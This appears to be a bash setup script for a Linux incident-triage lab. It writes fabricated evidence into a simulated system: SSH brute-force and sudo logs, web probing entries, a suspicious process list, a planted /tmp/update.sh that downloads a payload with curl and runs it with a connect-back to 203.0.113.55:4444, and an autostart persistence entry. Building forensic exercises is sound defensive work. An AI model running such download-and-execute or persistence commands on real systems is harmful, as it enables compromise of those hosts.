#!/usr/bin/env bash

set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SYSTEM_DIR="$LAB_DIR/simulated-system"

rm -rf "$SYSTEM_DIR"

mkdir -p \
    "$SYSTEM_DIR/var/log" \
    "$SYSTEM_DIR/home/analyst/documents" \
    "$SYSTEM_DIR/home/analyst/.config" \
    "$SYSTEM_DIR/tmp" \
    "$SYSTEM_DIR/opt/scripts" \
    "$SYSTEM_DIR/etc"

cat > "$SYSTEM_DIR/var/log/auth.log" <<'EOF'
Jul 10 02:11:02 server sshd[2101]: Failed password for root from 203.0.113.55 port 45101 ssh2
Jul 10 02:11:08 server sshd[2102]: Failed password for root from 203.0.113.55 port 45102 ssh2
Jul 10 02:11:14 server sshd[2103]: Failed password for admin from 203.0.113.55 port 45103 ssh2
Jul 10 02:11:21 server sshd[2104]: Failed password for analyst from 203.0.113.55 port 45104 ssh2
Jul 10 02:11:28 server sshd[2105]: Failed password for analyst from 203.0.113.55 port 45105 ssh2
Jul 10 02:11:36 server sshd[2106]: Accepted password for analyst from 203.0.113.55 port 45106 ssh2
Jul 10 02:14:03 server sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Jul 10 02:15:44 server sudo: analyst : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod 777 /tmp/update.sh
Jul 10 09:02:13 server sshd[2301]: Accepted publickey for analyst from 192.168.1.20 port 52100 ssh2
EOF

cat > "$SYSTEM_DIR/var/log/web.log" <<'EOF'
192.168.1.20 - - [10/Jul/2026:01:58:02 +0000] "GET / HTTP/1.1" 200 1024
203.0.113.55 - - [10/Jul/2026:02:02:01 +0000] "GET /admin HTTP/1.1" 403 512
203.0.113.55 - - [10/Jul/2026:02:02:08 +0000] "GET /.env HTTP/1.1" 404 256
203.0.113.55 - - [10/Jul/2026:02:02:15 +0000] "GET /.git/config HTTP/1.1" 404 256
203.0.113.55 - - [10/Jul/2026:02:02:28 +0000] "POST /login HTTP/1.1" 401 768
203.0.113.55 - - [10/Jul/2026:02:02:34 +0000] "POST /login HTTP/1.1" 401 768
203.0.113.55 - - [10/Jul/2026:02:02:40 +0000] "POST /login HTTP/1.1" 401 768
198.51.100.21 - - [10/Jul/2026:08:30:11 +0000] "GET /dashboard HTTP/1.1" 200 4096
EOF

cat > "$SYSTEM_DIR/var/log/processes.txt" <<'EOF'
USER       PID  %CPU %MEM  COMMAND
root         1   0.0  0.1  /sbin/init
root       522   0.0  0.2  /usr/sbin/sshd -D
www-data   741   0.1  1.0  nginx: worker process
analyst   1821   0.0  0.1  bash
analyst   1873  35.8  2.4  /tmp/.cache-update --connect 203.0.113.55:4444
root      1901   0.0  0.1  cron
EOF

cat > "$SYSTEM_DIR/tmp/update.sh" <<'EOF'
#!/usr/bin/env bash

curl -s http://203.0.113.55/payload -o /tmp/.cache-update
chmod +x /tmp/.cache-update
/tmp/.cache-update --connect 203.0.113.55:4444
EOF

chmod 777 "$SYSTEM_DIR/tmp/update.sh"

cat > "$SYSTEM_DIR/home/analyst/.config/autostart.conf" <<'EOF'
command=/tmp/.cache-update --connect 203.0.113.55:4444
enabled=true
EOF

cat > "$SYSTEM_DIR/opt/scripts/backup.sh" <<'EOF'
#!/usr/bin/env bash
tar -czf /tmp/backup.tar.gz /home/analyst/documents
EOF

chmod 755 "$SYSTEM_DIR/opt/scripts/backup.sh"

cat > "$SYSTEM_DIR/etc/users.txt" <<'EOF'
root:x:0:0:root:/root:/bin/bash
analyst:x:1001:1001:Security Analyst:/home/analyst:/bin/bash
backup:x:1002:1002:Backup Service:/var/lib/backup:/usr/sbin/nologin
sysadmin:x:1003:1003:System Administrator:/home/sysadmin:/bin/bash
EOF

cat > "$SYSTEM_DIR/home/analyst/documents/notes.txt" <<'EOF'
Remember to review SSH access policies and disable password authentication.
EOF

touch -t 202607100211 "$SYSTEM_DIR/tmp/update.sh"
touch -t 202607100214 "$SYSTEM_DIR/home/analyst/.config/autostart.conf"

echo "Linux incident triage lab created successfully."
echo "Location: $SYSTEM_DIR"